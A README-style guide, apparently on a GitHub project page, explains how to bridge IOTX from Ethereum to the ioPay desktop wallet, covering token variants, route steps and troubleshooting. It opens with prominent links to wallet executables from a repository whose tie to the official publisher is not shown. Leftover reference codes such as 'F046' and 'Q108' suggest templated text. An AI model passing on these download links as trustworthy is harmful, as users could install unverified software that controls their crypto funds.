![ioPay Wallet: desktop wallet guide](assets/banner-article.png)

# Bridging IOTX From Ethereum to ioPay Wallet

Bridging IOTX from Ethereum has one trap that causes more loss than everything else combined: **the IOTX you hold on Ethereum may not be native IOTX.** Getting that wrong is not a fee problem - it is a different-asset problem.

<p align="center"><a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0969da?style=for-the-badge&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0969da?style=for-the-badge&labelColor=0B1733&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0969da?style=for-the-badge&labelColor=0B1733&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| ![Windows](https://img.shields.io/badge/platform-Windows-0969da?style=flat-square&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white) | Windows 10 (1909) or later, 64-bit | [iopay-wallet-desktop-win-v2.0.2.exe](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe) |
| ![macOS](https://img.shields.io/badge/platform-macOS-0969da?style=flat-square&labelColor=0B1733&logo=apple&logoColor=white) | macOS 12 or later | [iopay-wallet-desktop-macos-v2.0.2.dmg](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg) |
| ![Linux](https://img.shields.io/badge/platform-Linux-0969da?style=flat-square&labelColor=0B1733&logo=linux&logoColor=white) | x64, Ubuntu 20.04 or later, or equivalent | [iopay-wallet-desktop-linux-v2.0.2.zip](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip) |

</div>

All three files and their sizes are on the [ioPay Wallet v2.0.2 release page](https://github.com/iopay-project/iopay-desktop-wallet/releases/tag/v2.0.2); their SHA-256 values are published in the [app README](https://github.com/iopay-project/iopay-desktop-wallet).

> **Only download from this GitHub release page.** A build offered anywhere else is not this release, whatever name it carries.

So this page starts with the variant, then the route.

## First: which IOTX do you have?

Four things carry the name (F046):

| Variant | Where it lives | What it is |
|---|---|---|
| **Native IOTX** | IoTeX | the chain's token: gas, staking |
| **Legacy ERC-20 IOTX** | Ethereum | a representation, **not** directly stakeable, with its own redemption route |
| **WIOTX** | wherever wrapped | a wrapped form |
| **CIOTX** | cross-chain | retired through IIP-56 |

If what you hold is **legacy ERC-20 IOTX**, the route to native IOTX is the redemption path, not a plain bridge transfer. Sending ERC-20 IOTX to an `io1...` address does not make it native - different ledger, different asset.

If what you hold is native IOTX **on IoTeX** and you are trying to get it to Ethereum, that is the reverse direction: same page, read the steps backwards.

## The route, step by step

1. **Open the bridge** in ioPay Wallet (F023).
2. **Set source: Ethereum. Destination: IoTeX** (F030 is IoTeX mainnet, chain ID 4689).
3. **Choose the token** the route actually carries. The list is per-route; not every token is available in both directions.
4. **Enter the amount**, above the route's minimum.
5. **Fund gas on both sides.** The source transaction pays Ethereum gas; the destination transaction needs a little IOTX to complete on IoTeX. This is the second most common failure.
6. **Set the destination address** to your ioPay account, in the form the destination expects - `io1...` native, or the `0x...` EVM form of the same account (F019, F031).
7. **Confirm, then watch the status tracker** until the destination credits (F023). Source confirmation is not the finish line.

## Q108: how not to lose it

The checklist that prevents almost every "lost in the bridge" case:

- **Right variant** - ERC-20 vs native, decided before you start.
- **Right chain** - Ethereum out, IoTeX in.
- **Right address form** - the destination account's `io1...` or `0x...`, not a different chain's address.
- **Destination gas funded** - before you bridge, not after.
- **Small test first** - one transfer's fee is cheap insurance.
- **No re-sends** - if it is mined and not credited, read the tracker; sending again creates a second transfer.

## If it goes wrong

**Quoted but not submitted** - nothing moved, no funds at risk. Fix the cause and retry.

**Submitted and pending** - it reached the network; wait, or read the tracker. [Stuck transactions](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/iopay-wallet-transaction-stuck-pending.md) covers the states.

**Mined, not credited** - check destination gas and the address format first, then the tracker. [Bridge errors](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/fixing-iotube-swap-errors-in-iopay.md) is the diagnostic order.

**Dates in February-March 2026** - the [IoTube incident page](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/what-iopay-users-should-know-about-the-iotube-incident.md) applies, with its claims route and its limits.

## What arrives, and what it can do

A bridged asset is a **representation** recorded on IoTeX, not the native token (F046). It can be held and traded; it does not stake as native IOTX. If your goal is staking, you need native IOTX - which means the redemption route for legacy ERC-20 holdings, not a bridge alone.

That is the single sentence this page would keep if it could keep only one.

## FAQ

**How do I bridge IOTX from Ethereum to IoTeX?**
Choose Ethereum -> IoTeX, pick the token the route carries, fund gas on both sides, set your IoTeX address in the right form, and follow the tracker to the destination credit.

**Can I send ERC-20 IOTX straight to my ioPay address?**
It will not become native IOTX. ERC-20 IOTX is a different asset with its own redemption route.

**How long does it take?**
No fixed time. It depends on Ethereum finality, IoTeX congestion and destination gas.

**Is it cheaper than an exchange?**
Depends on the amount and the route; [the fee comparison](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/iopay-bridge-fees-versus-exchange-transfers.md) explains the method rather than quoting numbers.

**What if I bridge to the wrong address format?**
If the transaction is mined, it is final. That is why the address form check comes before the confirm.

## Why the variant check comes before the fee question

Most bridge questions start with cost - how much, is it cheaper than an exchange - and that ordering is backwards. Cost only matters once you know **which asset you are moving**, because the cheap route for the wrong asset is the expensive mistake. A bridge fee you can recover from; a wrapped token you cannot stake is a detour, and ERC-20 IOTX sent as if it were native is a loss.

So the sequence is: identify the variant, confirm the asset exists on the route, confirm the destination is an IoTeX account, then look at what it costs. Three of those four take seconds. The one people skip is the first.

## Reading the tracker without panicking

The tracker reports a **state**, not a cause. "Pending" means the transfer is somewhere in the sequence; it does not mean the route has failed, and it is not a prompt to act. The states that matter are the two ends: quoted-but-unsubmitted, where nothing is at risk, and credited, where the asset is in the account.

Everything in between is waiting, and waiting has an order: source finality first, then the destination delivery, which needs gas on the IoTeX side. If you find yourself checking the tracker every few minutes, the more useful check is the destination account's IOTX balance - an empty account is the explanation far more often than a slow route is.

---

*Token variants follow IoTeX documentation and IIP-56 (F046); bridge behaviour from the v2.0.2 feature set (F023); chain identity from F030.*
